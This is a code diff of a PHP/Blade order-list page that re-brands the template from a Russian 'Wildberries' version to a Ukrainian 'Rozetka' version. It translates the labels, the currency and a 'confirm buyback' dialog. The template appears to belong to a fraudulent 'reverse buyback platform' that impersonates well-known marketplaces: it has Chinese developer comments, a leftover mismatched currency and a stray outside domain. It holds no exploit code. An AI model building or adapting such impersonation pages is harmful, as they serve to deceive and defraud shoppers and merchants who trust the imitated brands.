@@ -11,11 +11,11 @@
 	</style>
 	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-	<title>Список заказа - Wildberries</title>
-	<meta name="keywords" content="Платформа обратного выкупа для российских торговцев">
-	<meta name="description" content="Коллекции женской, мужской и детской одежды, обуви, а также товары для дома и спорта. Информация о доставке и оплате. Таблицы размеров, советы по уходу за вещами.">
+	<title>Список замовлень - Rozetka</title>
+	<meta name="keywords" content="Платформа зворотного викупу для українських торговців">
+	<meta name="description" content="Колекції жіночого, чоловічого та дитячого одягу, взуття, а також товари для дому та спорту. Інформація про доставку та оплату. Таблиці розмірів, поради по догляду за речами.">
 	<meta name="format-detection" content="telephone=no">
-	<link rel="shortcut icon" type="image/ico" href="https://wbbff.cc/favicon.ico">
+	<link rel="shortcut icon" type="image/ico" href="<?php echo asset("assets/favicon.ico") ?>">
 	<link type="text/css" rel="stylesheet" href="<?php echo asset("assets/style.css") ?>">
 	<script type="text/javascript" src="<?php echo asset("assets/jquery.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/global.js") ?>"></script>
@@ -26,15 +26,15 @@
 <body>
 	<div class="pagetop">
 		<div class="fh"><a href="<?php echo route("profile") ?>"></a></div>
-		<div>Список заказа</div>
+		<div>Список замовлень</div>
 		<!-- <div class="cd"><a href="javascript:top_menu();"></a></div> -->
 		<!-- 
 <div class="top_menu" id="top_menu">
 	<ul>
-	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Главная</span></a></li>
+	<li><a href="<?php echo route("index") ?>"><i class="top_tb1"></i><span>Головна</span></a></li>
 	<li><a href="https://wbbff.cc/index.php/category/list"><i class="top_tb2"></i><span>Каталог</span></a></li>
-	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Корзина</span></a></li>
-	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профиль</span></a></li>
+	<li><a href="<?php echo route("cart") ?>"><i class="top_tb3"></i><span>Кошик</span></a></li>
+	<li><a href="<?php echo route("profile") ?>"><i class="top_tb4"></i><span>Профіль</span></a></li>
 	</ul>
 	<div class="clear"></div>
 </div> -->
@@ -42,12 +42,12 @@
 	<div class="main" style="margin-top:0">
 		<div class="hy_tt">
 			<ul>
-				<li><a href="<?php echo route("order") ?>" class="sel">все</a></li>
-				<li><a href="<?php echo route("order") ?>">kат-я 1</a></li>
-				<li><a href="<?php echo route("order") ?>">kат-я 2</a></li>
-				<li><a href="<?php echo route("order") ?>">kат-я 3</a></li>
-				<li><a href="<?php echo route("order") ?>">kат-я 4</a></li>
-				<li><a href="<?php echo route("order") ?>">kат-я 5</a></li>
+				<li><a href="<?php echo route("order") ?>" class="sel">всі</a></li>
+				<li><a href="<?php echo route("order") ?>">кат-я 1</a></li>
+				<li><a href="<?php echo route("order") ?>">кат-я 2</a></li>
+				<li><a href="<?php echo route("order") ?>">кат-я 3</a></li>
+				<li><a href="<?php echo route("order") ?>">кат-я 4</a></li>
+				<li><a href="<?php echo route("order") ?>">кат-я 5</a></li>
 			</ul>
 		</div>
 		@foreach ($orders as $order)
@@ -68,7 +68,7 @@
 					<p class="c888 font12"></p>
 				</div>
 				<div class="dingdan_jg">
-					₾{{ $productInfo->price }}
+					₴{{ $productInfo->price }}
 					<div class="c999 font12">×{{ $product['quantity'] }}</div>
 					<div class="font12"><span class="corg"></span></div>
 				</div>
@@ -76,11 +76,11 @@
 			<div class="xuxian2"></div>
 			<div class="yingfu">
 				<div class="order_yf fr">
-					Всего：₾ <span class="font16 mar5">{{ $order->total_price }}</span> (Включая фрахт ₾{{ $order->shipping_cost }})
+					Всього：₴ <span class="font16 mar5">{{ $order->total_price }}</span> (Включаючи доставку ₴{{ $order->shipping_cost }})
 				</div>
 				<div class="clear"></div>
 				<div class="fr" style="padding:8px 10px 10px;">
-					<a class="tag_org fl" href="{{ route('submit_order', $order->id) }}">платить</a>
+					<a class="tag_org fl" href="{{ route('submit_order', $order->id) }}">оплатити</a>
 					<div class="clear"></div>
 				</div>
 				<div class="clear"></div>
@@ -96,7 +96,7 @@
 	<script type="text/javascript" src="<?php echo asset("assets/layer.js") ?>"></script>
 	<script type="text/javascript" src="<?php echo asset("assets/app.js") ?>"></script>
 	<script type="text/javascript">
-		//顶部菜单点击
+		//клік верхнього меню
 		function top_menu() {
 			if ($("#top_menu").is(":hidden")) {
 				$("#top_menu").show();
@@ -112,13 +112,13 @@
 	<script>
 		function confirm_huigou(order_id) {
 			layer.open({
-				content: "Определить выкуп этого Заказ？",
-				btn: ["OK", "Отмена"],
+				content: "Визначити викуп цього Замовлення？",
+				btn: ["OK", "Скасувати"],
 				shadeClose: false,
 				yes: function() {
 
 					/*layer.open({
-						content: '你点了确认',
+						content: 'ви натиснули підтвердити',
 						time: 1
 					});*/
 					$.ajax({
